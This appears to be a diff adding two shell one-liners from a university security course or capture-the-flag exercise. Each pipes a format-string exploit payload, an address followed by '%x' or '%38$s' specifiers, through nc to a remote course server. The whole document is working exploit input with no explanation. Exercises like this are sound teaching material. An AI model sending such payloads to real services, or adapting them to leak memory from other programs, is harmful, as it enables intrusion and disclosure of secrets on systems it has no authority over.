@@ -1,0 +1,3 @@
+python -c 'print "\x60\xa0\x04\x08" + "%x"*38' | nc secprog.cs.nctu.edu.tw 10104
+python -c 'print "\x60\xa0\x04\x08" + "%38$s"' | nc secprog.cs.nctu.edu.tw 10104
+
